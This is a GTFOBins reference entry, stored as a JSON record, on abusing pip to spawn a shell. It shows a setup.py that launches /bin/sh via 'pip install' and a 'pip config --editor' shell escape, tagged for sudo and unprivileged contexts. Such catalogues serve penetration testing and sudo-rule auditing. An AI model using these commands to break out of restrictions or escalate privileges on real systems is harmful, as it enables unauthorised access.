{"title": "pip", "source": "gtfobins", "source_label": "GTFOBins", "path": "pip", "html": "<h1>pip</h1>\n<h2>Inherit</h2>\n<p>This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).\n\nKeep in mind that the TTY is lost, so `/dev/tty` can be used, for example:\n\n```\necho &#x27;import os; os.system(&quot;exec /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty&quot;)&#x27; &gt;setup.py\n```\n\nThe `--break-system-packages` flag can be omitted in older systems.</p>\n<pre><code class=\"language-bash\">echo &#x27;...&#x27; &gt;setup.py\npip install --break-system-packages .</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">pip config --editor &#x27;/bin/sh -s&#x27; edit</code></pre>", "excerpt": "pip Inherit This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo &#x27;import os;…", "tags": ["func:inherit", "func:shell", "ctx:sudo", "ctx:unprivileged"]}